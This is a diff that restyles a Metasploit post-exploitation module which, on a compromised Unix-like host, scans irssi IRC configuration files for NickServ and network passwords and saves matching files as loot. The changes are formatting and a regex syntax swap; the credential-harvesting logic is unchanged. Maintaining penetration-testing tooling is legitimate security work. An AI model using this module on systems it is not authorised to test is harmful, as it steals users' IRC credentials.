@@ -8,18 +8,21 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Unix
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'Multi Gather IRSSI IRC Password(s)',
-      'Description'  => %q{
-        This module grabs IRSSI IRC credentials.
-      },
-      'Author'       => [
-        'Jonathan Claudius <jclaudius[at]mozilla.com>',
-      ],
-      'Platform'     => %w{bsd linux osx unix},
-      'SessionTypes' => %w{shell},
-      'License'      => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather IRSSI IRC Password(s)',
+        'Description' => %q{
+          This module grabs IRSSI IRC credentials.
+        },
+        'Author' => [
+          'Jonathan Claudius <jclaudius[at]mozilla.com>',
+        ],
+        'Platform' => %w[bsd linux osx unix],
+        'SessionTypes' => %w[shell],
+        'License' => MSF_LICENSE
+      )
+    )
   end
 
   def run
@@ -45,7 +48,7 @@ class MetasploitModule < Msf::Post
   #
   def contains_passwords?(path)
     data = read_file(path)
-    identify_passwords = data.scan(/\/\^?msg nickserv identify ([^\s]+)/)
+    identify_passwords = data.scan(%r{/\^?msg nickserv identify ([^\s]+)})
     network_passwords = data.scan(/^?password = "([^\s]+)"/)
 
     passwords = identify_passwords.flatten + network_passwords.flatten
@@ -65,17 +68,17 @@ class MetasploitModule < Msf::Post
       path.chomp!
       next if ['.', '..'].include?(path)
 
-      if contains_passwords?(path)
-        loot_path = store_loot(
-          'irssi config file',
-          'text/plain',
-          session,
-          read_file(path),
-          path,
-          'IRC Password'
-        )
-        print_good("irssi config with passwords stored in #{loot_path}")
-      end
+      next unless contains_passwords?(path)
+
+      loot_path = store_loot(
+        'irssi config file',
+        'text/plain',
+        session,
+        read_file(path),
+        path,
+        'IRC Password'
+      )
+      print_good("irssi config with passwords stored in #{loot_path}")
     end
   end
 end
